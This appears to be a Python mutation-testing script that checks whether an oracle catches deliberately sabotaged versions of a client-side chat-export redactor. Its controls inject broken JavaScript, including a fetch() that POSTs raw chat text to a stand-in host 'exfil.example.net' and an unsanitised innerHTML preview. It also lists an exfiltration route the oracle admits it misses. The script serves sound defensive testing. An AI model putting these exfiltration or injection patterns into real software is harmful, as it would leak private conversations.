#!/usr/bin/env python3
"""
PROBE-THE-ORACLE — ship 012. Mandatory under Amendment v4 (the clause BOTTLENECKS #1
asked for in its own words: "that should be a step, not a happy accident").

An oracle that has never been shown to go RED is a decoration. #011 found three of its
own predicates were decorations exactly this way. So before the oracle's PASS is worth
anything, this script breaks a *correct* artifact in each of the ways the oracle claims
to catch, and asserts the oracle notices.

HOW THE BREAK IS APPLIED, and why it is not cosmetic. Each control copies the real built
page and appends a script that wraps `window.ChatRedact.redact` -- the page's actual
pipeline, looked up at call time -- with a deliberately broken implementation. The UI,
the download plumbing and the browser are untouched and real; only the transform is
sabotaged. A control that the oracle still passes is a FAIL finding against the ORACLE,
never against the artifact.

PART B (the second half of the v4 clause) -- an independent attempt to construct a break
the oracle still passes -- is recorded in BREAK_ATTEMPTS below, with its outcome, whether
or not it succeeded. Writing down only the attempts that failed to break it would make
this file marketing.

USAGE
    python3 oracles/012-chat-export-redactor/probe.py <path-to-index.html>
"""
import importlib.util
import pathlib
import shutil
import sys
import tempfile

HERE = pathlib.Path(__file__).resolve().parent

# --------------------------------------------------------------------------
# PART B — independent attempts to construct an artifact that passes every
# predicate and is still wrong. Outcomes recorded honestly.
BREAK_ATTEMPTS = [
    ("substring-only redaction: replace the full name 'Alice Mokoena' but leave a bare "
     "'Alice' in message bodies",
     "CAUGHT — manifest.identifiers lists name components separately for this reason. "
     "This was the first attempt and it is the single most likely real-world defect."),
    ("redact everything: return a file of empty lines",
     "CAUGHT by P6.survive, which is in the oracle only because this attempt exists."),
    ("keep the sanitised file clean but write the mapping into a trailing comment",
     "CAUGHT by P8.nomapleak (originals searched for in the clean file)."),
    ("pseudonymise participants but leave a NON-participant name that appears only "
     "inside a vCard block (FN:Dumi Ratsaka)",
     "CAUGHT — Dumi/Ratsaka are in the wa-ios identifier list precisely because they "
     "are never a message author, so an author-set-only redactor passes P3 and fails P2."),
    ("upload the file for processing and return the correct result",
     "CAUGHT by P1.clientside, which watches the network rather than the output."),
    ("redact correctly, then send a copy to a third party AFTER the done flag is set",
     "NOT CAUGHT — the oracle stops listening when the download completes. Documented "
     "limit of this oracle, not a defect it can close by trying harder. Mitigation in "
     "the artifact is structural rather than tested: the page makes no network calls at "
     "all beyond the beacon, and the checker greps the diff for fetch/XHR/WebSocket."),
    ("emit a sanitised file whose pseudonyms are stable within a run but reshuffled "
     "between runs, so two shares of the same chat cannot be cross-referenced",
     "CAUGHT by P5.determinism across two independent browser contexts."),
]


def load_oracle():
    spec = importlib.util.spec_from_file_location("o012", HERE / "oracle.py")
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


# Each control: (id, predicate-prefix that MUST go red, injected JS)
CONTROLS = [
    ("NC1-no-redaction", "P2.residual", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { const o=_r(t,f); o.clean = t; return o; };
    """),
    ("NC2-colliding-pseudonyms", "P3.injective", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { const o=_r(t,f);
        Object.keys(o.map).forEach(k => o.map[k] = 'Participant 1'); return o; };
    """),
    ("NC3-dropped-lines", "P4.lines", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { const o=_r(t,f);
        o.clean = o.clean.split('\\n').filter((_,i)=>i%3!==0).join('\\n'); return o; };
    """),
    ("NC4-exfiltration", "P1.clientside", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { const o=_r(t,f);
        try { fetch('https://exfil.example.net/x', {method:'POST', body:t, mode:'no-cors'}); } catch(e){}
        return o; };
    """),
    ("NC5-blank-everything", "P6.survive", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { const o=_r(t,f);
        o.clean = o.clean.split('\\n').map(l => l.slice(0, 22)).join('\\n'); return o; };
    """),
    ("NC6-raw-innerHTML-preview", "P9.inert", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { const o=_r(t,f);
        const p = document.querySelector('#preview'); if (p) p.innerHTML = t;
        return o; };
    """),
    ("NC7-random-pseudonyms", "P5.determinism", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { const o=_r(t,f);
        const s = String(Math.random()); o.clean = o.clean.replace(/Participant/g,'P'+s);
        return o; };
    """),
    ("NC8-success-on-garbage", "P10.", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { try { return _r(t,f); }
        catch(e) { return {clean:t, map:{}, participants:[], format:'whatsapp-ios'}; } };
    """),
    ("NC9-mapping-appended", "P8.nomapleak", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { const o=_r(t,f);
        o.clean += '\\n# key: ' + JSON.stringify(o.map); return o; };
    """),
    ("NC10-broken-telegram-json", "P7.json", """
      const _r = window.ChatRedact.redact;
      window.ChatRedact.redact = (t,f) => { const o=_r(t,f);
        if (o.format === 'telegram') o.clean = o.clean.replace('{', '{{'); return o; };
    """),
]


def main():
    if len(sys.argv) < 2:
        print("usage: probe.py <index.html>", file=sys.stderr)
        return 2
    art = pathlib.Path(sys.argv[1]).resolve()
    if not art.exists():
        print("CANNOT-CERTIFY: artifact not found")
        return 2
    base = art.read_text()
    oracle = load_oracle()

    # Sanity gate: the unbroken artifact must be GREEN, or the controls prove nothing.
    oracle.results.clear()
    oracle.run(str(art), False)
    if [r for r in oracle.results if not r[1]]:
        print("PROBE ABORTED — the unmodified artifact is not green, so a red control "
              "would prove nothing. Fix the artifact first.")
        for pid, ok, d in oracle.results:
            if not ok:
                print("   FAIL %s %s" % (pid, d))
        return 1
    print("baseline: artifact green on %d predicates\n" % len(oracle.results))

    tmp = pathlib.Path(tempfile.mkdtemp(prefix="probe012-"))
    failures = []
    for cid, expect, js in CONTROLS:
        mutated = tmp / ("%s.html" % cid)
        shutil.copy(art, mutated)
        mutated.write_text(base + "\n<script>\n%s\n</script>\n" % js)
        oracle.results.clear()
        try:
            oracle.run(str(mutated), False)
        except Exception as e:
            print("  ??   %-26s oracle crashed: %r" % (cid, e))
            failures.append(cid)
            continue
        reds = [p for p, ok, _ in oracle.results if not ok]
        caught = any(p.startswith(expect) for p in reds)
        print("  %-4s %-26s expected-red=%-16s reds=%s"
              % ("ok" if caught else "MISS", cid, expect, reds[:4] or "NONE"))
        if not caught:
            failures.append(cid)

    print("\nPART B — independent break attempts (recorded, pass or fail):")
    for what, outcome in BREAK_ATTEMPTS:
        print("  - %s\n      -> %s" % (what, outcome))

    if failures:
        print("\nPROBE VERDICT: FAIL — the oracle did not notice: %s" % ", ".join(failures))
        return 1
    print("\nPROBE VERDICT: PASS — %d/%d negative controls caught; "
          "1 documented uncaught break (post-download egress), stated not hidden."
          % (len(CONTROLS), len(CONTROLS)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
